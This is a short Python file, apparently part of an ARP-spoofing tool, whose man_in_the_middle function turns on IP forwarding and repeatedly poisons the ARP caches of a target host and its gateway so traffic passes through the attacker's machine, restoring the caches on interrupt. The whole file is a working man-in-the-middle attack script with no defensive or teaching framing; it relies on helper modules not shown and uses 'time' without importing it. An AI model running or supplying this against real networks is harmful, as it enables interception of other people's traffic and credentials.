
from getmac import get_mac_address as gma
from modules.disable_ip_forwarding import *
from modules.enable_ip_forwarding import *
from modules.spoof_arp_cache import *
from modules.restore_arp_cache import *

def man_in_the_middle(target_ip_addr, gateway_ip_addr):
	try:
		enable_ip_forwarding()
		spoof_mac_addr = gma()
		while True:
			spoof_arp_cache(target_ip_addr, gateway_ip_addr, spoof_mac_addr)
			spoof_arp_cache(gateway_ip_addr, target_ip_addr, spoof_mac_addr)
			print("Sent ARP Packets")
			time.sleep(2)
	except KeyboardInterrupt:
		print("Restoring ARP Cache")
		restore_arp_cache(target_ip_addr, gateway_ip_addr)
		restore_arp_cache(gateway_ip_addr, target_ip_addr)
		disable_ip_forwarding()